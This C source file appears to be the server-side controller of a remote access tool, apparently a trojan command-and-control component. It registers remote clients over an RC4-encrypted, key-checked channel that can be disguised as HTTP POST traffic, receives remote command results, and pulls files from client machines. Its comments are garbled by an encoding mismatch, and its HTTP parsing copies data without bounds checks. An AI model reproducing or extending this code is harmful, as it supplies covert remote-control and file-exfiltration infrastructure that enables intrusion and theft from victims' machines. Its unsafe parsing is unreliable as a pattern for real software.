#include "recv.h"

int dispose_http_recv(char *RecvBuffer,char **buffer,int *write_len,int *sur_len,int recv_size)
{
    //����1��ʾ����û�����꣬0��ʾ�����ѽ�����
    char *pStart=NULL,*pEnd=NULL;
    char str[MAX_SIZE];
    int packet_size=0;

    memset(str,NULL,sizeof(str));

    if(*buffer==NULL)
    {
        if((pStart=strstr(RecvBuffer,"Content-Length:"))==NULL)
            return -1;
        pStart+=16;
        if((pEnd=strstr(pStart,"\r"))==NULL)
            return -1;
        memcpy(str,pStart,pEnd-pStart);
        packet_size=atoi(str);          //��ȡ���ݰ���С

        *buffer=(char *)malloc(packet_size+1);
        if(*buffer==NULL)
        {
            MessageBox(NULL,"malloc error","Error",MB_OK);
            exit(-1);
        }
        memset(*buffer,NULL,packet_size+1);
        pStart=strstr(RecvBuffer,"\r\n\r\n");
        if(pStart==NULL)
            return -1;
        pStart+=4;
        *write_len=recv_size-(pStart-RecvBuffer);       //��д������ݳ���
        *sur_len=packet_size-*write_len;                //��δд������ݳ���
        //printf("��д��%d\n",*write_len);
        memcpy(*buffer,pStart,*write_len);
        if(*write_len==packet_size)
            return 0;
    }
    else
    {
        pStart=*buffer;
        pStart+=*write_len;
        if(*sur_len<recv_size)
        {
            memcpy(pStart,RecvBuffer,*sur_len);
            *write_len+=*sur_len;
        }
        else
        {
            memcpy(pStart,RecvBuffer,recv_size);
            *write_len+=recv_size;
            *sur_len-=recv_size;
            if(*sur_len!=0)
                return 1;
        }
        return 0;
    }
    return 1;
}

int RecvClientInfo(SOCKET ClientSocket,ClientInfo *CI)
{
    char RecvBuffer[MAX_SIZE+1],SendBuffer[MAX_SIZE];
    char *pStart=NULL;
    ClientInfo *tmp=NULL;

    memset(RecvBuffer,NULL,sizeof(RecvBuffer));
    memset(CI,NULL,sizeof(ClientInfo));

    if(recv(ClientSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
    {
        //���տͻ��˷��͹����ļ������Ϣ
        closesocket(ClientSocket);
        return -1;
    }

    if(!strncmp(RecvBuffer,"POST",4))
    {
        //��ǰ�ͻ���ʹ��HTTP��������
        memset(RecvBuffer,NULL,sizeof(RecvBuffer));
        if(recv(ClientSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
        {
            //���մ����������������content
            closesocket(ClientSocket);
            return -1;
        }
    }
    memcpy(CI,RecvBuffer,sizeof(ClientInfo));
    rc4_crypt(S_box,(unsigned char *)CI,sizeof(ClientInfo));
    if(strcmp(CI->key,KEY))
    {
        //KEY��֤��ͨ�������������Ŀͻ�������
        //printf("��֤��ͨ��.\n");
        closesocket(ClientSocket);
        return -1;
    }
    if(CI->HTTP_Proxy)
    {
        //printf("ͨ��HTTP����.\n");
        memset(SendBuffer,NULL,sizeof(SendBuffer));
        sprintf(SendBuffer,HTTP_Header,6);
        strcat(SendBuffer,"Hello!");
        //����HTTP��Ϣ
        if(send(ClientSocket,SendBuffer,strlen(SendBuffer),0)<=0)
            return -1;
    }
	for(pStart=CI->OS;*pStart!=NULL;pStart++)
		if(*pStart=='\n' || *pStart=='\r')
			*pStart=' ';
    //��ʾ�ÿͻ��˵�������Ϣ
    //printf("�ͻ���������:%s\tIP:%s\n",CI->name,CI->ip);

    return 0;
}

void RecvFile(gpointer Parameter)
{
    DownloadFileStruct DFS=*(DownloadFileStruct *)Parameter;
    free(Parameter);
    MessageStruct MS;
    memset(&MS,NULL,sizeof(MessageStruct));
    int i;
    for (i=0; i<10000 && Download_Socket==INVALID_SOCKET; i++) Sleep(1);
    SOCKET soc=Download_Socket;
    Download_Socket=INVALID_SOCKET;
    if(i==10000)
    {
        strcat(MS.title,"Error");
        strcat(MS.content,"Socket time out");
        CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
        g_thread_exit(NULL);
    }
    GtkWidget *pbar=DownCon.pbar;
    char RecvBuffer[MAX_SIZE+1];
    WSAEVENT WSAEvent;
    WSAOVERLAPPED overlap;
    WSABUF WSABuffer;
    DWORD RecvSize=0,flags=0;
    FILE *file=NULL;
    int WriteSize=0;
    int ret=0,write_len=0,sur_len=0;
    char *http_buffer=NULL;
    unsigned long acc=0;

    memset(&overlap,NULL,sizeof(WSAOVERLAPPED));

    WSAEvent=overlap.hEvent=WSACreateEvent();
    WSABuffer.len=sizeof(RecvBuffer)-1;
    WSABuffer.buf=RecvBuffer;

    if((file=fopen(IODataArray[DFS.index]->download_path,"wb"))==NULL)
    {
        closesocket(soc);
        strcat(MS.title,"Error");
        strcat(MS.content,"Create local file error!");
        CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
        g_thread_exit(NULL);
    }

    while(1)
    {
        memset(&RecvBuffer,NULL,sizeof(RecvBuffer));
        WSARecv(soc,&WSABuffer,1,&RecvSize,&flags,&overlap,NULL);
        WSAWaitForMultipleEvents(1,&WSAEvent,FALSE,WSA_INFINITE,FALSE);
        WSAGetOverlappedResult(soc,&overlap,&RecvSize,TRUE,&flags);
        WSAResetEvent(WSAEvent);

        if(RecvSize<=0)
        {
            break;
        }
        if(IODataArray[DFS.index]->Client.HTTP_Proxy)
        {
            //����HTTP Header
            if((ret=dispose_http_recv(RecvBuffer,&http_buffer,&write_len,&sur_len,RecvSize))==1)
                continue;
            else if(ret==-1)
            {
				if(http_buffer!=NULL)
                    free(http_buffer);
                http_buffer=NULL;
                MessageBox(NULL,"Download failed!Error info:create local file failed","Error",MB_OK);
                return;
            }
        }
        else
            write_len=RecvSize;

        //���ݰ�������ɣ������յ�������д���ļ�
        if(IODataArray[DFS.index]->Client.HTTP_Proxy)
        {
            //HTTP�����ļ���ʽ
            WriteSize=fwrite(http_buffer,sizeof(char),write_len,file);
            if(WriteSize==0 && write_len!=0)
            {
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                sprintf(RecvBuffer,"Write file failed!error code:%d",GetLastError());
                MessageBox(NULL,RecvBuffer,"Error",MB_OK);
                break;
            }
            fflush(file);
            free(http_buffer);
            http_buffer=NULL;
        }
        else
        {
            WriteSize=fwrite(RecvBuffer,sizeof(char),write_len,file);
            if(WriteSize==0 && write_len!=0)
            {
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                sprintf(RecvBuffer,"Write file failed!error code:%d",GetLastError());
                MessageBox(NULL,RecvBuffer,"Error",MB_OK);
                break;
            }
        }

        if(IODataArray[DFS.index]->Client.HTTP_Proxy)
        {
            //���յ��ļ����ݺ���ͻ��˷���
            if(Send_HTTP_Header(soc,8)!=0)
                break;
            if(send(soc,"Continue",8,0)<=0)
                break;
        }

        acc+=WriteSize;
        gdk_threads_enter();
        update_progressbar(pbar,DFS.TotalSize,acc,2);
        gdk_threads_leave();
    }
    //printf("�ļ��������.\n");
    fclose(file);
    closesocket(soc);
    WSACloseEvent(WSAEvent);

    g_thread_exit(NULL);
}

void CheckHTTPOnlineClient()
{
	unsigned long int curr_time=0;
	int i;

	while(1)
	{
		EnterCriticalSection(&CRI_Total);
		for(i=0;i<TotalConnection;i++)
		{
			if(IODataArray[i]->Client.HTTP_Proxy)
			{
				curr_time=time(NULL);
	    	    curr_time-=IODataArray[i]->time;
	    	    if(curr_time>=30)
				{
			    	//printf("����%s������\n",IODataArray[i]->Client.name);
		    	    closesocket(ClientSocketArray[i]);
				}
			}
		}
		LeaveCriticalSection(&CRI_Total);
		Sleep(500);
	}
	return;
}

void RecvMessageFromClient(gpointer Parameter)
{
    char *pStart=NULL,*pEnd=NULL;
    char SendBuffer[MAX_SIZE];
    int number=ListenThreads;
    int _TotalConnection=1;
    DWORD Index=0;
    DownloadFileStruct *DFS=NULL;
    MessageStruct MS;
    SOCKET *_ClientSocketArray=ClientSocketArray+(number-1)*MAXIMUM_WAIT_OBJECTS;
    WSAEVENT *_WSAEventArray=WSAEventArray+(number-1)*MAXIMUM_WAIT_OBJECTS;
    IO_OPERATION_DATA **_IODataArray=IODataArray+(number-1)*MAXIMUM_WAIT_OBJECTS;

    while (1)
    {
        Index=WSAWaitForMultipleEvents(_TotalConnection,_WSAEventArray,FALSE,1,FALSE);
        if(Index==WSA_WAIT_FAILED || Index==WSA_WAIT_TIMEOUT)
        {
            //printf("_TotalConnection:%d\n",_TotalConnection);
            if(number==ListenThreads)
                _TotalConnection=TotalConnection-(ListenThreads-1)*MAXIMUM_WAIT_OBJECTS;
            else if(number<ListenThreads)
                _TotalConnection=MAXIMUM_WAIT_OBJECTS;
            if(_TotalConnection<=0)
            {
                //printf("�߳��˳�.\n");
                EnterCriticalSection(&CRI_ListenThreas);
                ListenThreads--;
                LeaveCriticalSection(&CRI_ListenThreas);
                g_thread_exit(NULL);
            }
            continue;
        }
        //printf("���¼�����\n");

        Index-=WSA_WAIT_EVENT_0;       //��ȡ��Ӧ�¼�����������
        WSAResetEvent(_WSAEventArray[Index]);          //�����¼�
        WSAGetOverlappedResult(_ClientSocketArray[Index],&_IODataArray[Index]->overlap,&_IODataArray[Index]->NumberOfBytesRecvd,\
                               TRUE,&_IODataArray[Index]->flags);
        if(_IODataArray[Index]->NumberOfBytesRecvd<=0)
        {
            //printf("�ͻ���%s�˳���(���ݽ���ʧ��)\n",_IODataArray[Index]->Client.ip);
            CleanupClientConnection(_ClientSocketArray[Index]);
            _TotalConnection--;            //���߳��ڵ���������һ
            if(_TotalConnection<=0)
            {
                //printf("�߳��˳�.\n");
                EnterCriticalSection(&CRI_ListenThreas);
                ListenThreads--;
                LeaveCriticalSection(&CRI_ListenThreas);
                g_thread_exit(NULL);
            }
            //printf("_TotalConnection:%d\n",_TotalConnection);
            continue;
        }

        pStart=_IODataArray[Index]->RecvBuffer;
        if(!strncmp(pStart,"POST",4))
        {
            //���յ�HTTP_Header
            goto skip;
        }
        rc4_crypt(S_box,(unsigned char *)pStart,_IODataArray[Index]->NumberOfBytesRecvd);  //����
        pEnd=strchr(pStart,':');
        if (pEnd==NULL)
            goto skip;
        if(!strncmp(pStart,"Command_Results",pEnd-pStart))
        {
            //���յ�����ִ�н��
            pStart=++pEnd;
        }
        else if(!strncmp(pStart,"CreateFileSuccess",pEnd-pStart))
        {
            //���Կ�ʼ�ϴ��ļ�
            UploadFileFlag=1;
        }
        else if(!strncmp(pStart,"CreateFileFailed",pEnd-pStart))
        {
            //�ϴ��ļ�����
            memset(&MS,NULL,sizeof(MessageStruct));
            strcat(MS.title,"Error");
            strcat(MS.content,"Create remote file failed!");
            CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
            UploadFileFlag=-1;
        }
        else if(!strncmp(pStart,"Download_File_Failed",pEnd-pStart))
        {
            //�����ļ�����
            memset(&MS,NULL,sizeof(MessageStruct));
            strcat(MS.title,"Error");
            strcat(MS.content,"Download file failed!Error info:");
            pEnd++;
            strcat(MS.content,pEnd);
            CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
        }
        else if(!strncmp(pStart,"Download_File_Start",pEnd-pStart))
        {
            //�ļ���������
            //printf("�ļ���ʼ����...\n");
            DFS=(DownloadFileStruct *)malloc(sizeof(DownloadFileStruct));
            if(DFS==NULL)
            {
                MessageBox(NULL,"malloc error","error",MB_OK);
                exit(-1);
            }
            memset(DFS,NULL,sizeof(DownloadFileStruct));
            pStart=++pEnd;
            DFS->index=Index;
            DFS->TotalSize=atoi(pStart);
            g_thread_create((GThreadFunc)RecvFile,(gpointer)DFS,TRUE,NULL);    //�½������ļ��߳�
        }
		else if(!strncmp(pStart,"Keep-Alive",pEnd-pStart))
		{
			_IODataArray[Index]->time=time(NULL);
		}
        if(_IODataArray[Index]->Client.HTTP_Proxy)
        {
            //����HTTP_Header
            memset(SendBuffer,NULL,sizeof(SendBuffer));
            sprintf(SendBuffer,HTTP_Header,8);
            strcat(SendBuffer,"Continue");
            if(send(_ClientSocketArray[Index],SendBuffer,strlen(SendBuffer),0)<=0)
            {
                //printf("�ͻ���%s�Ͽ����ӡ�(HTTP_Header����ʧ��)\n",_IODataArray[Index]->Client.ip);
                CleanupClientConnection(_ClientSocketArray[Index]);
                _TotalConnection--;            //���߳��ڵ���������һ
                if(_TotalConnection==0)
                {
                    //printf("�߳��˳�.\n");
                    EnterCriticalSection(&CRI_ListenThreas);
                    ListenThreads--;
                    LeaveCriticalSection(&CRI_ListenThreas);
                    g_thread_exit(NULL);
                }
                continue;
            }
        }
skip:
        memset(_IODataArray[Index]->RecvBuffer,NULL,MAX_SIZE+1);
        WSARecv(_ClientSocketArray[Index],&_IODataArray[Index]->WSAbuffer,1,&_IODataArray[Index]->NumberOfBytesRecvd,
                &_IODataArray[Index]->flags,&_IODataArray[Index]->overlap,NULL);
    }
    g_thread_exit(NULL);
}